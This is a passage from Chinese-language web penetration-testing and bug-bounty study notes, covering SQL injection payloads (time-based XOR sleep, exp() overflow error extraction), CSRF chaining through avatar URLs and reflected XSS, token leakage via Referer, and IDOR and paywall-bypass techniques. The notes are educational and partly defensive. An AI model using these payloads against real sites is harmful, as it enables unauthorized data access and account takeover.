+<h2 id="3-4-SQL-注入"><a href="#3-4-SQL-注入" class="headerlink" title="3.4 SQL 注入"></a>3.4 SQL 注入</h2><h3 id="3-4-1-延时注入技巧"><a href="#3-4-1-延时注入技巧" class="headerlink" title="3.4.1 延时注入技巧"></a>3.4.1 延时注入技巧</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;XOR(if(now()=sysdate(),sleep(15),0))XOR&#x27;</span>Z</span><br><span class="line"><span class="comment">-- 有时候很抽象的是 如果将 now()=sysdate() 改为 1 就不执行sleep()，理论上是执行的</span></span><br><span class="line"><span class="comment">-- 很多时候后端会过滤 or and || &amp;&amp; ， 可以尽量使用一些小众的逻辑符号 如 xor</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- sleep -&gt; WAIT FOR DELAY &#x27;0:0:5&#x27; -&gt; BENCHMARK(10000000, MD5(1))</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>推理深挖</strong>：为什么 <code>now()=sysdate()</code> 改为 <code>1</code> 就不执行 sleep？<code>now()</code> 和 <code>sysdate()</code> 在 MySQL 中的返回值有微妙区别——<code>now()</code> 返回语句开始执行时的时间，<code>sysdate()</code> 返回函数实际执行时的时间。两者在大多数情况下相等，但理论上存在差异窗口。当改为 <code>1</code>（恒真）时，按理说 <code>if(1, sleep(15), 0)</code> 应该执行 sleep，但如果不执行，可能的原因是<strong>短路径求值优化</strong>或者<strong>查询缓存</strong>干扰——这是一个需要具体环境具体分析的诡异点。</p>
+<p>延时函数的替代链条（sleep → WAIT FOR DELAY → BENCHMARK）反映了绕过思路：当 <code>sleep</code> 被过滤时，尝试其他数据库的延时函数；当函数被过滤时，尝试通过大量计算（BENCHMARK）来制造时间延迟。</p>
+</blockquote>
+<h3 id="3-4-2-验证语句"><a href="#3-4-2-验证语句" class="headerlink" title="3.4.2 验证语句"></a>3.4.2 验证语句</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- AND 型</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="operator">&amp;&amp;</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="operator">&amp;&amp;</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- OR 型（在不确定是否是 delete 接口时，还是不要使用，避免删库了）</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="operator">||</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="operator">||</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>推理深挖</strong>：AND 型和 OR 型的区别在于注入位置对 SQL 逻辑的影响。AND 型适合在 WHERE 子句的条件拼接处注入，OR 型适合在没有结果返回时强行拉出数据。但 OR 型的危险在于——如果注入了 <code>OR 1=1</code> 且语句是 DELETE&#x2F;UPDATE，就会影响全表。所以 <code>id=-1</code>（一个大概率不存在的 id）作为 OR 的前置条件是保护措施——即使 OR 1&#x3D;1 成立，也只是操作了一个不存在的记录。</p>
+</blockquote>
+<h3 id="3-4-3-报错注入——exp-方法"><a href="#3-4-3-报错注入——exp-方法" class="headerlink" title="3.4.3 报错注入——exp() 方法"></a>3.4.3 报错注入——exp() 方法</h3><p><code>exp()</code> 方法在 709 数值之内不会报错，当大于等于 710 就会报错。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这不是 SQL 标准行为，而是 MySQL 中 <code>exp()</code> 函数的溢出边界——<code>exp(710)</code> 的结果超过了 DOUBLE 类型的最大值，MySQL 抛出 <code>DOUBLE value is out of range</code> 错误。攻击者利用这个溢出点将数据”夹带”在错误信息中返回。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="number">709</span>)   <span class="comment">-- 正常</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="number">710</span>)   <span class="comment">-- 报错</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> SLEEP(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>逐字符提取的思路</strong>：把 710 往上提升，直到正好 <code>x - ascii(CURRENT_USER) = 710</code> 或 709 就可以判断某个数值的 ASCII 值。例如 <code>r</code> 的 ASCII 值为 114，因此可以使用 823 和 824 进行判断：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="built_in">EXP</span>(<span class="number">823</span> <span class="operator">-</span> ASCII(<span class="built_in">CURRENT_USER</span>));  <span class="comment">-- 823 - 114 = 709（正常）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="built_in">EXP</span>(<span class="number">824</span> <span class="operator">-</span> ASCII(<span class="built_in">CURRENT_USER</span>));  <span class="comment">-- 824 - 114 = 710（报错）</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>推理深挖</strong>：为什么是 823？因为 709（安全边界值）+ 114（目标字符的 ASCII）&#x3D; 823。如果第一位字符确实是 ‘r’（114），那 823-114&#x3D;709，在安全范围内，不报错。如果是其他字符（比如 ‘s’&#x3D;115），那 823-115&#x3D;708 也在安全范围内——所以需要同时测试 823 和 824，通过二分确定准确值。这就是<strong>基于布尔盲注思想的报错注入变体</strong>，把”是否报错”变成了布尔信号。</p>
+</blockquote>
+<h3 id="3-4-4-倍数延迟是什么原因？"><a href="#3-4-4-倍数延迟是什么原因？" class="headerlink" title="3.4.4 倍数延迟是什么原因？"></a>3.4.4 倍数延迟是什么原因？</h3><p>如果 sleep 之后延迟了 45（15×3）秒，那出现倍数延迟的原因是什么？延迟分为两种：查询时执行一次；插入日志执行一次。这里是三倍可能是又做了什么操作。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：正常情况下 sleep(15) 应该延迟 15 秒，延迟 45 秒意味着 sleep 被调用了 3 次。为什么会调用 3 次？可能的原因：</p>
+<ol>
+<li>SQL 语句被多次执行（业务代码循环了几次）</li>
+<li>子查询中每个匹配的行都触发了一次 sleep</li>
+<li>日志写入触发了额外的查询</li>
+</ol>
+<p>这种<strong>倍数延迟</strong>本身就是一种信息泄露——它告诉了你后端大概有多少条匹配记录，或者 SQL 被执行的次数。延迟不只是”注入成功了”的信号，还可以是”数据量”的侧信道。</p>
+</blockquote>
+<p>还有一些知识点是<strong>派生表注入</strong>（涉及子查询等），这是一个很容易被忽略的点。派生表注入利用了子查询中缺乏过滤的情况——很多开发只对最外层的 WHERE 条件做了参数化，但子查询中的拼接没有防御。</p>
+<hr>
+<h2 id="3-5-通用思路"><a href="#3-5-通用思路" class="headerlink" title="3.5 通用思路"></a>3.5 通用思路</h2><p>扫目录，看看能不能出一些东西。</p>
+<hr>
+<h2 id="3-6-CSRF-挖掘"><a href="#3-6-CSRF-挖掘" class="headerlink" title="3.6 CSRF 挖掘"></a>3.6 CSRF 挖掘</h2><p>目前国内对待 CSRF 漏洞——要么低危，要么直接忽略。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么会这样？因为 CSRF 单独来看确实危害有限——需要诱导用户点击、需要用户已登录、通常只能做用户权限内的操作。所以挖掘 CSRF 的核心不是证明”存在 CSRF”，而是证明”这个 CSRF 能造成什么实际危害”。<strong>CSRF 的价值不在于漏洞本身，而在于它能和什么其他漏洞&#x2F;功能组合</strong>。</p>
+</blockquote>
+<p>CSRF（跨站请求伪造）是一种常见的网络安全威胁。它允许攻击者在不知情的用户的浏览器中伪造请求，从而在用户不自觉的情况下，以该用户的身份执行非授权操作。这种攻击通常针对那些执行重要操作的网站，如在线银行和社交网络。</p>
+<p><strong>攻击方式</strong>：</p>
+<ul>
+<li>通过链接：诱导用户点击一个链接来触发恶意请求。</li>
+<li><strong>通过图片</strong>：在图片的 src 属性中嵌入恶意请求，当图片加载时，请求被发送（一般是研究这个怎么扩大影响）。图片方式的特殊之处在于——它是<strong>无交互的</strong>，用户不需要点击，只需要看到图片（比如在评论区、论坛帖子中嵌入），浏览器就会自动加载图片从而发出请求。</li>
+<li>通过自动提交的表单：在用户不知情的情况下发送请求。</li>
+<li>通过第三方网站：在第三方网站上嵌入恶意代码，当用户访问该网站时触发请求。</li>
+</ul>
+<h3 id="3-6-1-案例一：头像场景——链接可控吗？"><a href="#3-6-1-案例一：头像场景——链接可控吗？" class="headerlink" title="3.6.1 案例一：头像场景——链接可控吗？"></a>3.6.1 案例一：头像场景——链接可控吗？</h3><p>更换头像的场景：抓取头像更改的数据包，发现其参数（一般是 POST）存在一个链接就是用来加载头像图片的。其逻辑是，用户上传图片到云存储桶里面，请求的时候会将云存储桶的图片加载回来。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个场景的思考起点是——头像是一个图片 URL，而这个 URL 是由谁控制的？如果用户能控制头像 URL 的内容，那本质上就是<strong>用户在自己的头像位置嵌入了一个任意链接</strong>。其他用户浏览你的头像时，浏览器就会自动请求这个链接（携带他们的 cookie）。</p>
+</blockquote>
+<p>那就要测试一下这个参数链接是否可控。又回到链接是否可控的测试了——子域名、父域名、<code>@</code> 的操作、各种编码、<code>https → http</code>？其他通信协议？双写 <code>https</code>（<code>httpshttps</code>）？</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这些测试项本质上都是在探测<strong>URL 白名单的边界</strong>——白名单允许哪些域名？用什么方式校验？有没有解析差异可以利用？每一个测试项都在问一个具体的问题：</p>
+<ul>
+<li>子域名 → 白名单是精确匹配还是后缀匹配？</li>
+<li><code>@</code> → URL 解析库有差异吗？</li>
+<li>编码 → 校验前解码还是校验后解码？</li>
+<li>https→http → 协议降级是否被允许？</li>
+<li>双写 → 是否只做字符串替换而非语义解析？</li>
+</ul>
+</blockquote>
+<p>如果是<strong>可跨域</strong>的话危害就很大了，直接在自己的攻击服务器部署 payload。如果<strong>不可跨域</strong>的话危害就变小了，尝试寻找这个域下是否存在一些反射型 XSS 进行联动。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这里的关键思维是：<strong>当直接攻击不可行时，寻找间接的跳板</strong>。同域下的反射型 XSS 就是跳板——头像 URL 触发 XSS，XSS 可以读取同域下的敏感数据或执行敏感操作，链条就接上了。</p>
+</blockquote>
+<p>在一些评论区下评论，头像链接就会被加载，并将链接执行同一 web 站点（同域）下的反射型 XSS 漏洞处，实现无需用户交互的 CSRF（也是一种反射型 XSS 的扩大危害）。</p>
+<p>如果找不到反射型 XSS，可以抓取<strong>退出登录</strong>（同域）的链接，并将其作为恶意链接——其他用户一旦加载我的头像就会退出登录，直接影响用户的体验感（对于一些大的网站也是会给到中危的）。这里的思路是把危害降级但依然保留——<strong>找不到高危利用链，中危的也行，总比什么都不交强</strong>。</p>
+<h3 id="3-6-2-案例二：店铺-Token-劫持"><a href="#3-6-2-案例二：店铺-Token-劫持" class="headerlink" title="3.6.2 案例二：店铺 Token 劫持"></a>3.6.2 案例二：店铺 Token 劫持</h3><p>我们以店铺的身份与客户交流，发一些店铺的链接给客户，不需要任何交互客户就会访问我们给的链接。然后我们自己点击这个链接并抓取数据包，发现数据包中带出了 token。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：这个案例的关键洞察在于<strong>信息流向的分析</strong>：谁发起的请求？请求中携带了什么？token 是在什么环节被带出的？</p>
+<p>如果 token 出现在 URL 参数或 Referer 中，那第三方页面就能收到这些信息。如果 token 是店铺的访问凭证，那意味着——拿到这个 token &#x3D; 拿到店铺的控制权。</p>
+</blockquote>
+<p>所以我们可以继续准备一个店铺，并观察店铺的主页是否存在可控链接进而实现自动跳转（上文提到的头像），并最终跳转（携带 token）到我们的攻击服务器，服务器就可以获得用户的 token，进而实现任意账号接管的结果。</p>
+<blockquote>
+<p><strong>逻辑链</strong>：发链接 → 客户点击 → 浏览器携带 token 访问 → 页面中嵌入的可控链接触发跳转 → token 被 Referer 泄露给攻击服务器。</p>
+</blockquote>
+<p>（涉及跨域问题，但根据描述，大概率是可以跨域的。）</p>
+<h3 id="3-6-3-CSRF-小结"><a href="#3-6-3-CSRF-小结" class="headerlink" title="3.6.3 CSRF 小结"></a>3.6.3 CSRF 小结</h3><p>根据上面的知识，可知我们并不是注重 CSRF 漏洞的本身危害，而是更加关注与其他攻击链路的配合实现危害的扩大（<strong>无交互</strong>）。单独 CSRF 不可怕，CSRF + XSS + Token 劫持的<strong>组合链</strong>才可怕。挖掘的时候始终问自己：<strong>这个请求如果被伪造，能造成什么连锁反应？</strong></p>
+<blockquote>
+<p><strong>再深一层——攻击链的构建有一个通用公式</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">入口点（可控输入/可控链接） → 跳板（信息泄露/权限提升） → 目标（敏感操作/数据获取）</span><br></pre></td></tr></table></figure>
+<p>上面的两个案例完美对应：</p>
+<ul>
+<li>头像场景：可控头像 URL（入口）→ 同域反射型 XSS（跳板）→ 任意操作（目标）</li>
+<li>店铺场景：可控店铺链接（入口）→ Referer 泄露 token（跳板）→ 账号接管（目标）</li>
+</ul>
+<p>挖掘的时候，不要孤立地评估一个 bug 的危害——把它放在这个公式里看：<strong>它能不能做入口？能不能做跳板？能不能靠近目标？</strong> 一个单独的”头像 URL 可控”可能只是低危，但它 + 一个反射型 XSS &#x3D; 高危。这就是为什么 CSRF 的价值不在它本身，而在它<strong>串联</strong>的能力。</p>
+</blockquote>
+<hr>
+<h1 id="四、越权"><a href="#四、越权" class="headerlink" title="四、越权"></a>四、越权</h1><h2 id="4-1-三种类型"><a href="#4-1-三种类型" class="headerlink" title="4.1 三种类型"></a>4.1 三种类型</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>定义</th>
+<th>严重程度</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>水平越权</strong></td>
+<td>用户具有相同等级的权限，通过更换某个 id 之类可以使同级用户 A 获取（修改、删除）同级用户 B 的数据</td>
+<td>高</td>
+</tr>
+<tr>
+<td><strong>垂直越权</strong></td>
+<td>使用低身份账号，发送高权限才有的请求，获得更高权限的操作</td>
+<td>更高</td>
+</tr>
+<tr>
+<td><strong>未授权访问</strong></td>
+<td>通过删除请求中的认证信息后重新发送该请求，依旧可以访问或者完成操作</td>
+<td>最高</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>推理深挖</strong>：三者之间的关系——未授权访问是最严重的（完全不需要身份），其次是垂直越权（低权限做高权限的事），再次是水平越权（同级别之间互串）。但从实际业务影响来看，水平越权如果涉及大量用户数据，危害可能高于一个只能访问管理后台但无数据操作的垂直越权。<strong>定级取决于”能拿到什么数据&#x2F;能做什么操作”，而不只是”漏洞类型”</strong>。</p>
+</blockquote>
+<h2 id="4-2-核心——对数字绝对敏感"><a href="#4-2-核心——对数字绝对敏感" class="headerlink" title="4.2 核心——对数字绝对敏感"></a>4.2 核心——对数字绝对敏感</h2><p>越权的核心是对 id 数字这些要非常敏感，无论是请求包还是返回包。修改请求包的数字，查看返回包的 JSON 数据（键名），大致猜测是否缺乏鉴权（比如返回的 JSON 数据没有鉴权的字段）。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么是”数字”？因为数字是程序中最常见的<strong>对象引用</strong>（用户 ID、订单 ID、商品 ID、地址 ID…），而数字天然具有可遍历性——你不需要知道别人的 ID 是多少，你只需要遍历。如果系统没有做”当前用户是否有权限访问 ID&#x3D;N 的资源”的校验，那你遍历每一个 N 就能拿到每一个用户的数据。</p>
+</blockquote>
+<p>越权之后，为了扩大影响，观察返回的数据，是否存在一些登录凭证，然后替换 cookie 就可以实现任意登录。越权本身可能只是”看到了不该看的数据”，但如果返回的数据中包含 session&#x2F;token&#x2F;cookie，那就能从”只读”升级到”完全控制”。</p>
+<blockquote>
+<p><strong>逻辑链</strong>：越权读取数据 → 返回数据中包含凭证 → 用凭证替换自己的 cookie → 完全接管目标账号。</p>
+</blockquote>
+<p>对于目标事务 id 的获取，如一些评论的 id，可以抓取对其点赞的数据包获取其 id（或者 F12）。这里体现的思路是：<strong>当你需要一个 ID 但前端不展示时，去找任何操作了这个对象的功能点</strong>——点赞、收藏、分享、举报——这些操作的数据包里一定包含被操作对象的 ID。</p>
+<h2 id="4-3-各种场景"><a href="#4-3-各种场景" class="headerlink" title="4.3 各种场景"></a>4.3 各种场景</h2><p><strong>简历场景</strong>：对于一些发送简历给 HR 的场景，思考是否可以通过某种方式导致别人已经发送的简历（存在服务器中）会发送到自己的邮箱。这个场景的攻击面在于：简历的”投递目标”字段是否可控？如果可控，修改投递目标就能将别人的简历发送到自己邮箱。</p>
+<p><strong>评论越权</strong>：删除评论操作、仅自己可见等（水平越权）。别人的评论能不能被我删除？能不能被我设为仅自己可见（从而隐藏）？</p>
+<p><strong>Sign&#x2F;Signature 鉴权</strong>：有些时候发现数据包的请求头有 <code>sign</code>、<code>signature</code> 等字段，大概率是对身份进行了鉴权。这时候就要想，是不是<strong>用户身份与其数据脱离了</strong>？也就是说，sign 可能证明了”你是合法用户”，但 sign 没有绑定到”你只能操作你自己的数据”这个层面。<strong>身份认证（Authentication）通过了，但授权（Authorization）缺失。</strong></p>
+<p><strong>商品购买绕过</strong>：一个商品的 id 为 96，另一个为 103。现在商品号为 103 的商品暂时不可以购买。抓取第一个商品的购买数据包，然后将 id 改为 103，就可以购买 103 号的商品了。这里的漏洞原因是后端未对商品 ID 的有效性、可售状态进行校验，导致攻击者可以任意修改商品 ID 购买任何商品。</p>
+<p>补充一下——我都点不动那个不能购买的商品，我怎么知道其商品 id？直接刷新一下页面。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么刷新页面能拿到 ID？因为前端只是隐藏了”购买按钮”，但商品的 ID 可能仍然存在于页面源码中（比如在某个 data 属性、某个隐藏的 input 中，或者从列表接口返回的 JSON 中已经包含了所有商品信息）。<strong>前端隐藏 ≠ 数据不存在</strong>，这是贯穿所有 Web 安全的核心原则。</p>
+</blockquote>
+<p>延伸一下，什么环境可以使用这些方法？比如有一个演唱会，必须 16 号才能买票，这些大型活动是可以给到高危的。比如新老用户，只有新用户才可以购买的商品。危害评级由具体的环境场景而定。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：为什么同样的技术手法，危害评级不同？因为<strong>危害 &#x3D; 技术影响 × 业务影响</strong>。提前买到演唱会票或新用户专享商品，直接损害了正常用户的利益和活动的公平性——这就是高业务影响。</p>
+</blockquote>
+<p><strong>客服聊天记录</strong>：抓取与客服的聊天记录的数据包，看看能不能看到其他用户与客服的聊天信息。客服系统往往是独立模块，鉴权可能比较薄弱。</p>
+<p><strong>地址管理界面</strong>：比如京东购物的地址、外卖地址等。地址是隐私信息，能越权查看&#x2F;修改别人的地址是典型的水平越权。</p>
+<h2 id="4-4-不安全对象的直接调用（IDOR）"><a href="#4-4-不安全对象的直接调用（IDOR）" class="headerlink" title="4.4 不安全对象的直接调用（IDOR）"></a>4.4 不安全对象的直接调用（IDOR）</h2><p>当应用程序直接使用用户提供的输入（如 ID、文件名、数据库键值）来访问内部对象（如记录、文件、数据库条目），而没有对当前用户的权限进行充分验证时，就产生了不安全的直接对象引用漏洞（Insecure Direct Object Reference，简称 IDOR）。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：IDOR 的核心问题不在于”用户能不能访问某个对象”，而在于<strong>系统默认信任了”用户提供的标识符”与”用户有权访问的资源”之间的一一对应关系</strong>。但实际上这个对应关系是需要服务端校验的——系统应该说”你给你的 ID，我查一下你有没有权限”，而不是”你给你的 ID，我直接返回这个 ID 的数据”。</p>
+</blockquote>
+<h3 id="4-4-1-案例：付费视频绕过"><a href="#4-4-1-案例：付费视频绕过" class="headerlink" title="4.4.1 案例：付费视频绕过"></a>4.4.1 案例：付费视频绕过</h3><p>在一个视频网站，由于没有解锁，只能看 60 秒。思路是：</p>
+<ol>
+<li>检查网页源代码，搜索 <code>play_url</code> 或 <code>url</code> 这些关键词。一般可以看到免费的视频会展示其播放地址，付费的课程是没有展示其播放地址的。为什么在源码中找？因为前端需要播放视频就必须知道视频地址——对于免费视频，地址直接写在了前端；对于付费视频，地址可能通过 Ajax 异步获取，或者被接口权限拦截。</li>
+<li>将免费视频的 URL 地址复制，然后丢到浏览器播放，并尝试删除一些认证相关的参数（<code>thekey</code>…），且可以大概知道那个参数决定了那个视频。如果正常播放，猜测付费视频的逻辑也是类似的。这里用的是<strong>类比推理</strong>：同一套视频系统，免费和付费的鉴权逻辑大概率是同一个模板，只是参数不同。</li>
+<li>首先查看这些参数的格式是否存在可以自主构造的可能？如果是关键的参数是一些哈希或者随机数，构造和爆破是不可行的。能否翻阅前端元素获取泄露的关键参数的值？为什么存在这种可能呢？因为可能一些业务（比如排行榜等）有可能泄露没有加密的关键参数，或者是给你免费看 60 秒的视频泄露出来了关键参数。</li>
+<li>这里的思考过程还复杂了——直接抓取付费视频的数据包并发送到后端，返回的会带有播放地址，然后再进行下一步操作。<strong>与其猜测参数，不如直接请求接口试试</strong>——也许后端根本没做鉴权，只是前端没显示播放按钮。</li>
+<li>不限于付费视频，还有付费文章等。</li>
+</ol>
+<h3 id="4-4-2-免费-付费接口对比法"><a href="#4-4-2-免费-付费接口对比法" class="headerlink" title="4.4.2 免费&#x2F;付费接口对比法"></a>4.4.2 免费&#x2F;付费接口对比法</h3><p>如果发现了一些免费资料的 API 接口，可以将参数中某些参数换为付费资料的参数（可以大概知道哪些参数起决定性作用）。</p>
+<p>最好是对免费接口与付费接口进行比较。但是如果无法打开付费接口（不是前端 JS 验证）怎么办？又用到上面提到的知识点——通过抓包（刷新页面…）或 F12 得到目标的 id 参数。<strong>所有操作的 ID 最终都会在某个数据包里出现</strong>——你只需要找到它。</p>
+<h2 id="4-5-UUID-场景——不可预测的-UUID-怎么越权？"><a href="#4-5-UUID-场景——不可预测的-UUID-怎么越权？" class="headerlink" title="4.5 UUID 场景——不可预测的 UUID 怎么越权？"></a>4.5 UUID 场景——不可预测的 UUID 怎么越权？</h2><p>对于数据包：<code>POST /users/xxx-xx-x--xs-x-s（即uuid）/address ...</code> 以及 JSON 数据。</p>
+<p>UUID 有的是可预测的有的是不可预测的。那什么样的 UUID 可以预测呢？比如根据服务器的 MAC 地址以及时间形成的 UUID（UUIDv1）是可以预测的（可以观察到这个 UUID 的某一部分似乎不动）。但是很多情况下是不可以预测的。</p>
+<p>同时很明显是一个 API 风格的接口，使用 JSON 传参。</p>
+<p><strong>那不可预测的 UUID 有什么思路呢？</strong></p>
+<ol>
+<li>转变一下请求方式（GET&#x2F;POST&#x2F;PUT…）——实际上一开始不要进行操作，有点浪费时间，最好往业务更深处走。为什么？因为同一接口的不同 HTTP 方法可能有不同的鉴权逻辑——GET 可能不需要鉴权（因为只是查询），POST&#x2F;PUT&#x2F;DELETE 才需要。或者反过来，POST 做了鉴权但 GET 忘了。</li>
+<li>删除 UUID 改为 <code>list</code>——很多接口是 <code>/users/list</code>（属于经验）。这是利用了 RESTful API 的命名惯例——资源集合通常用复数名词如 <code>/users</code>，单个资源用 <code>/users/{id}</code>。如果 <code>/users/{id}</code> 有鉴权但 <code>/users</code> 没有，你就能拿到所有用户列表。</li>
+</ol>
+<blockquote>
+<p><strong>再深一层——这两个思路本质上在做同一件事：绕过”细粒度鉴权”，尝试”粗粒度入口”</strong>。<code>/users/{uuid}</code> 是有针对性的鉴权（这个人只能访问他自己的资源），但 <code>/users</code>（全列表）和 <code>GET</code> 替代 <code>POST</code>（只读替代写入）的鉴权可能宽松得多。开发者的心理是：列表嘛，看一下又不会怎样；GET 嘛，又没有修改数据。<strong>攻击者就利用这种心理</strong>——你设了门禁的前门我不走，我去试试你忘了锁的侧门。</p>
+</blockquote>
+<p><strong>引入一些知识：云存储的防止文件覆盖。</strong> 为了防止不同用户上传具有相同文件名的文件进行相互覆盖，所以每个用户所上传文件的地方是自己独有的（实际实现就是以用户划分的文件夹）。那也就是说，这个路径会出现用户名或其他形式的 UUID。如果此时我们能够越权，而 UUID 是不可以预测的，那请问怎么找到别的用户的 UUID 呢？难道只靠爆破？</p>
+<p>可以发散思考——比如查看某个用户的头像：</p>
+<ul>
+<li><code>/users/ashud75-234-adjsidj-1943ad/avatar.png</code></li>
+<li>那 <code>ashud75-234-adjsidj-1943ad</code> 就是这个用户的 UUID。</li>
+</ul>
+<blockquote>
+<p><strong>推理深挖</strong>：这里的核心洞察是：<strong>UUID 虽然不可预测，但它在很多地方会”泄露”</strong>——头像 URL、文件下载路径、分享链接、评论中的 @ 提及…只要这个 UUID 对外展示过，你就能收集到它。所以”不可预测”不等于”不可获取”。</p>
+<p><strong>再深一层——UUID 泄露的本质是”标识符的复用”</strong>：系统用 UUID 来标识一个用户，那这个 UUID 就必然会在一切需要引用这个用户的地方出现。头像、文件名、分享链接、API 响应、WebSocket 消息——标识符无法隐藏，因为它就是用来被引用的。所以收集 UUID 不需要攻击系统，只需要<strong>正常使用系统的所有功能并观察流量</strong>——UUID 自己会出现在该出现的地方。</p>
+</blockquote>
+<p>现在我们就需要找到怎么越权了。<strong>核心点再次强调：要耐心尝试各种功能。</strong></p>
+<p>对于 <code>/users/ashud75-234-adjsidj-1943ad/address/897</code>，对数字敏感：将 897 修改为几个不同值，发现请求出错。那就思考：</p>
+<ol>
+<li>是否是对接口做了防护？可能是 897 这个 ID 确实不属于当前用户，被拦截了。</li>
+<li>猜测 UUID 与后面的 ID 有关联（即 897），如执行 SQL 语句 <code>条件1=uuid AND 条件2=897</code>。如果是这种双条件校验，那你改 ID 就会导致”找不到记录”——因为记录确实存在，只是 UUID 和 ID 的对应关系不匹配。</li>
+</ol>
+<p>那下一步只能爆破后面的 ID 了。危害取决于这个越权会带来什么影响。</p>
+<blockquote>
+<p><strong>推理深挖</strong>：如果刚刚这种爆破实现了越权的，实际上是服务器没有将 UUID 与 Cookie 进行校验。也就是说——服务器校验了”UUID + ID 是否对应一条存在的记录”，但<strong>没有校验”这条记录是否属于当前登录用户”</strong>。这是典型的”只校验存在性，不校验归属权”的问题。</p>
+<p><strong>再深一层——这个缺陷模式的通用形式是</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table WHERE resource_uuid = ? AND resource_id = ?</span><br></pre></td></tr></table></figure>
+<p>这条 SQL 只保证了”记录存在”，但”这条记录的 owner 是不是当前用户”完全没查。正确的做法应该是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM table WHERE resource_uuid = ? AND resource_id = ? AND owner_id = ?</span><br></pre></td></tr></table></figure>
+<p>多一个 <code>owner_id</code> 条件，但这个条件恰恰是开发者最常忘记加的——因为他们认为”能知道 UUID 的人就是 owner”。这就是”隐蔽式安全”的典型翻车现场。</p>
+</blockquote>
+<p>还有一点就是，在未授权的情况下不要进行增删改查，可以自己新建一个号。<strong>自建测试账号是最安全的测试方式</strong>——你可以充分对比两个账号的行为差异，而不会误操作他人的数据。</p>
+<hr>
+<h1 id="五、威胁情报挖掘"><a href="#五、威胁情报挖掘" class="headerlink" title="五、威胁情报挖掘"></a>五、威胁情报挖掘</h1><h2 id="5-1-什么是威胁情报？"><a href="#5-1-什么是威胁情报？" class="headerlink" title="5.1 什么是威胁情报？"></a>5.1 什么是威胁情报？</h2><ul>
+<li>订单信息泄漏（赏金重捞区，也是白帽子被坑钱最多的地方）</li>
+<li>刷单（如果不是刷单诈骗，那真实的刷单团伙如何挣钱和交易的呢？这个追问本身就值得深挖——理解黑产的经济模型才能找到情报）</li>
+<li>视频刷量</li>
+<li>账号实名制解除、更换、代实名认证</li>
+<li>企业资质认证等各种特权账号认证</li>
+<li>…</li>
+</ul>
+<p>简单的总结就是：发现对公司的业务存在潜在威胁的事情，就是威胁情报。和漏洞不一样——漏洞是技术层面的缺陷，威胁情报是业务层面的风险。一个刷单团伙不会利用漏洞，但他们利用企业的规则和流程来牟利——这也需要被关注和处理。</p>
